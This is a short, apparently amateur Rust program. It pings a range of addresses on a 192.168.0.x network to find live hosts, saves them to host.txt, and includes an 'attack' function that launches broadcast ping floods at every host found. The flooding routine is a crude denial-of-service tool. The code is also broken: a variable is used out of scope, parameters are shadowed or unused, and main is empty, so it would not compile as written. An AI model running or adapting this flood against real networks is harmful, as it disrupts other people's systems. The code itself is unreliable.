use std::process::Command;
use std::fs::OpenOptions;
use std::io::{self, Write};
use std::thread;
use std::time::Duration;

fn scan(gatw: &str){
    let mut ipa = Vec::new();
    let mut i = 1;
    let mut gatw = String::new();

    println!("Enter the gateway (192.168.0.): ");
    io::stdin()
        .read_line(&mut gatw)
        .expect("Failed to read line");
    let gatw = gatw.trim();

    while i < 40 {
        let host = format!("{}{}", gatw, i);
        let output = Command::new("ping")
            .arg("-s")
            .arg("56")
            .arg("-c")
            .arg("5")
            .arg("-i")
            .arg("1")
            .arg(&host)
            .output()
            .expect("Failed to execute ping command");

        if output.status.success() {
            println!("[{}] is alive", host);
            ipa.push(host);
        }
        i += 1;
        thread::sleep(Duration::from_millis(50));
    }
}

fn attack(ip: &str, count: i32){
    for j in ipa {
	Command::new("ping")
	    .arg("-b")
            .arg("-f")
            .arg("-i")
            .arg("2")
            .arg(&j)
            .spawn()
            .expect("Failed to execute ping command");
    }
}

fn save_to_file(){
    println!("{:?}", ipa);
    let mut file = OpenOptions::new()
        .append(true) // Append to the file
        .create(true) // Create the file if it doesn't exist
        .open("host.txt")
        .expect("Failed to open file");

    for k in &ipa {
        writeln!(file, "{}", k).expect("Failed to write to file");
    }
}

fn main() {
}
